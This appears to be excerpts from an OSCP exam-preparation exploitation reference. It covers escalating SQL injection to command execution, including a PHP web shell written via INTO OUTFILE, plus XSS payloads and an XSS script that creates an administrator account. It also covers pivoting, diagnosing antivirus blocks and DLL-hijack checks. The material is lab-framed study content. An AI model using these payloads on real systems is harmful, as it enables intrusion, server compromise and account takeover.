This is a new transition, not an automatic consequence of SQL injection. Verify the DBMS identity, database role, feature state, filesystem permissions and path or egress assumptions first.

<details>
<summary><strong>MSSQL — xp_cmdshell when privilege and policy allow</strong></summary>

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Requires sufficient server privilege; enabling it changes server configuration. Prefer a direct proof when it is already enabled. Verify the Windows service identity returned by `whoami`.

</details>

<details>
<summary><strong>PostgreSQL — COPY PROGRAM when role and version allow</strong></summary>

```sql
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(line text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

Requires a superuser or a role such as `pg_execute_server_program`; the command runs under the database service account.

</details>

<details>
<summary><strong>MySQL/MariaDB — file write as a separate primitive</strong></summary>

```sql
SELECT '<?php echo shell_exec($_GET["cmd"]); ?>'
INTO OUTFILE '/CONFIRMED/WEBROOT/check.php';
```

Requires `FILE` privilege, a permitted `secure_file_priv` destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven.

</details>

First inject a unique text marker and inspect where it appears in raw HTML and the DOM. Then use a controlled proof appropriate to the context:

```html
<img src=x onerror=alert(document.domain)>
```

Classify the path:

- reflected: victim must visit a crafted request;
- stored: payload persists and a relevant user later renders it;
- DOM-based: client-side code moves controlled data into an executable DOM sink.

> **Decisive output:** JavaScript executes under the expected application origin and viewer context. Reflection or HTML display alone is not XSS.

Match the proof to the observed parser context rather than trying a random payload list:

| Observed insertion context | Minimal lab proof candidate | What failure means |
| --- | --- | --- |
| HTML element body | `<svg onload=alert(document.domain)>` | Sanitization, CSP or non-executable render context |
| Double-quoted attribute | `" autofocus onfocus="alert(document.domain)` | Quote may be encoded or event attribute stripped |
| Existing JavaScript string | `';alert(document.domain);//` | Input may be JSON/string escaped or not reach executable script |
| URL-decoded parameter | percent-encode the context-matched payload in the request | Decode layer or client normalization differs |

Image/SVG/HTML5 event variants are alternative parser entry points, not evidence of distinct vulnerabilities. Inspect the resulting DOM and browser console/CSP before adding encoding or filter-bypass complexity.

`HttpOnly` prevents JavaScript from reading that cookie, but same-origin XSS may still issue authenticated requests from the victim browser. Recreate a legitimate privileged workflow and obtain its anti-CSRF value first:

```javascript
fetch('/admin/users/new')
  .then(r => r.text())
  .then(t => {
    const token = new DOMParser().parseFromString(t, 'text/html')
      .querySelector('input[name="csrf"]')?.value;
    return fetch('/admin/users', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({username:'NEW_USER', password:'NEW_PASSWORD', role:'administrator', csrf:token})
    });
  });
```

> **Prerequisites:** the payload is rendered by a suitably privileged victim, under the correct origin; the paths/fields come from captured normal behavior; CSP and application logic allow execution; the action is permitted in the victim session.

> **Verification:** authenticate as `NEW_USER` and perform one administrator-only action. If application administration exposes a legitimate plugin/template/file-upload function, continue with [web file handling](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/03-initial-access/02-web-file-handling.md) and re-prove server execution.

For every additional hop, write another complete segment:

```text
Kali -> tunnel A -> PIVOT_A -> tunnel B -> PIVOT_B -> INTERNAL_HOST:PORT
```

Rules:

- validate one hop before adding the next;
- avoid overlapping local/VPN/internal routes;
- use unique listener and SOCKS ports;
- record which session owns each route;
- ensure the deeper agent/client can reach the upstream listener;
- re-evaluate DNS and callback direction at every hop;
- prefer a routed method for several deep services instead of stacking many opaque wrappers.

An upstream tunnel failure invalidates every deeper observation. Do not troubleshoot target credentials until the complete path is restored.

| Observation | Most useful next action |
| --- | --- |
| Transferred hash differs | Repair transfer/encoding before execution |
| File arrives then vanishes | Inspect quarantine/detection events and resource path |
| File remains; process creation denied | Inspect AppLocker/WDAC, permissions and parent process |
| Script-loading policy error | Inspect scope/precedence; use an authorized process-only invocation if applicable |
| Explicit AMSI/content block | Treat content/control as confirmed; encoding alone is not a supported conclusion |
| Process starts then exits | Capture exit/error, dependency and architecture evidence |
| Process remains; no connection | Test target egress, LHOST and listener |
| TCP handshake then close | Handler/payload mismatch, stage failure, crash or control interruption |

Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore:

- changing a filename does not imply a new payload;
- Base64 does not imply concealment from AMSI;
- an in-memory technique is not automatically invisible;
- an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass;
- a clean third-party scanner result does not prove execution on the target and may disclose a private sample.

Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun.

Windows Defender status, when the current identity can query it:

```powershell
Get-MpComputerStatus |
  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled
```

Do not label every failure “AV.” Differentiate:

- file never arrived or hashes differ;
- file arrived and disappeared/quarantined;
- process creation was denied;
- script content was blocked;
- process started and exited/crashed;
- callback was blocked after execution;
- application-control or language-mode restrictions;
- ordinary format, architecture, permission or dependency errors.

Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit.

For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with [payload execution obstacles](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md).

Confirm:

1. exact DLL/helper/config name and architecture;
2. privileged process actually requests it;
3. selected attacker-writable location precedes the legitimate resolution;
4. payload preserves required exports/behavior where necessary;
5. reliable trigger exists.

```cmd
icacls "C:\Path\To\Application"
sc.exe qc SERVICE
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
```

> Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, `CreateFile`, `.dll`, and `NAME NOT FOUND` provide decisive runtime evidence; low-privilege remote use may be unavailable.
